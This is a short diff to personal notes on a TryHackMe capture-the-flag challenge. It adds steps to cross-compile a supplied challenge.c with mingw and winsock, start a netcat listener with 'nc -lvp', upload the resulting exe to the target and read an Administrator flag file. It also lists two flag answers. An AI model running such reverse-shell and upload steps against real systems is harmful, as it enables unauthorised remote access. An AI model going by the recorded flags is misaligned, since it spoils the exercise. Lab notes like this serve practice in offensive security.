@@ -96,4 +96,9 @@ THM{N0_1MP0r75_F0r_Y0U}
 
 get challenge.c change ip and port
 install mingw: sudo apt install mingw-w64
-compile: 
+compile: x86_64-w64-mingw32-gcc challenge.c -o challenge.exe -lwsock32 -lws2_32 
+nc -lvp [port from challenge.c]
+go to target ip: http://[IP]
+-upload challenge.exe
+-go to C:\Users\Administator\Desktop\flag.txt
+flag: THM{08FU5C4710N_15 MY_10V3_14N6U463}
